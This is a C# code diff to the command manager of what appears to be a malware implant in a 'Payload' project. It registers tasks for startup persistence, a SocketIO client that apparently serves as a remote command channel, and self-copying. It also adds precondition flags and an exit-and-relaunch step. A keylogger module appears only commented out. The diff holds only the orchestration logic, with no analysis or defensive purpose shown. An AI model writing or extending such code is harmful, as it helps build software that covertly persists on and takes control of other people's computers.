@@ -38,14 +38,24 @@ namespace Payload.Command
         }
         #endregion
         public Dictionary<Payload.Common.Config.EnumTask, TaskPack> TaskMap { get; private set; }
+        public Dictionary<Payload.Common.Config.EnumTask, bool> FlagMap { get; private set; }
 
         private void Init() // Task Mapping 
+        {
+            FlagMap = new Dictionary<EnumTask, bool>();
+            RegisterTask();
+        }
+
+        private void RegisterTask()
         {
             TaskMap = new Dictionary<Common.Config.EnumTask, TaskPack>();
             //TaskMap.Add(Common.Config.EnumTask.Demo, new DemorFactory().CreateTaskPack());
 
-            TaskMap.Add(Common.Config.EnumTask.TcpClient, new SocketIOClientFactory().CreateTaskPack());
-            //TaskMap.Add(Common.Config.EnumTask.KeyListener, new KeyListenerFactory().CreateTaskPack());
+            TaskMap.Add(Common.Config.EnumTask.StartupSetup, new StartupSetupFactory().CreateTaskPack());
+            TaskMap.Add(Common.Config.EnumTask.SocketIO, new SocketIOClientFactory().CreateTaskPack());
+
+
+            TaskMap.Add(Common.Config.EnumTask.CopyItself, new CopyItselfFactory().CreateTaskPack());
         }
 
         public bool AddTaskPack(Common.Config.EnumTask _key, TaskPack _tp)
@@ -71,11 +81,12 @@ namespace Payload.Command
         public void AddWallpaperCmd(WallPaper.Mode _mode)
         {
             TaskPack taskPack;
-            taskPack = CommandManager.Instance.GetTaskPack(Common.Config.EnumTask.WallpaperEngine);
+            EnumTask key = Common.Config.EnumTask.WallpaperEngine;
+            taskPack = CommandManager.Instance.GetTaskPack(key);
             if (taskPack == null)
             {
                 taskPack = new Payload.Command.WallPaper.WallpaperEngineFactory().CreateTaskPack();
-                CommandManager.Instance.AddTaskPack(Common.Config.EnumTask.WallpaperEngine, taskPack);
+                CommandManager.Instance.AddTaskPack(key, taskPack);
             }
             WallPaper.WallpaperEngineCommand wpeCmd = ((WallPaper.WallpaperEngineCommand)taskPack.Command);
             wpeCmd.CurrentMode = _mode;
@@ -88,7 +99,25 @@ namespace Payload.Command
                     wpeCmd.ResetWallpaper();
                     break;
             }
-            taskPack.Start();
+            taskPack.Start(key);
+        }
+        public void CommandDone(EnumTask task)
+        {
+            if (FlagMap.ContainsKey(task))
+                FlagMap[task] = true;
+            else
+                FlagMap.Add(task, true);
+        }
+        private bool TaskDone(HashSet<EnumTask> tasks)
+        {
+            foreach(var item in tasks)
+            {
+                bool flag = false;
+                FlagMap.TryGetValue(item, out flag);
+                if(!flag)
+                    return false;
+            }
+            return true;
         }
 
         public void Run()
@@ -96,6 +125,11 @@ namespace Payload.Command
             foreach (var taskPack in TaskMap)
             {
                 TaskPack _tp = taskPack.Value;
+                if(_tp.Mode.Equals(EnumTaskPackMode.EXIT) && _tp.Executed)
+                {
+                    new StartProcessCommand().Execute();
+                    Environment.Exit(0);
+                }
                 if (_tp == null)
                     continue;
                 if (_tp.Mode.Equals(EnumTaskPackMode.NONE) || !_tp.ShouldCallRun)
@@ -104,7 +138,9 @@ namespace Payload.Command
                     continue;
                 if (_tp.Task!=null && _tp.Task.Status.Equals(TaskStatus.Running))
                     continue;
-                _tp.Start();
+                if (_tp.Precondition.Count > 0 && !TaskDone(_tp.Precondition))
+                    continue;
+                _tp.Start(taskPack.Key);
             }
         }
     }
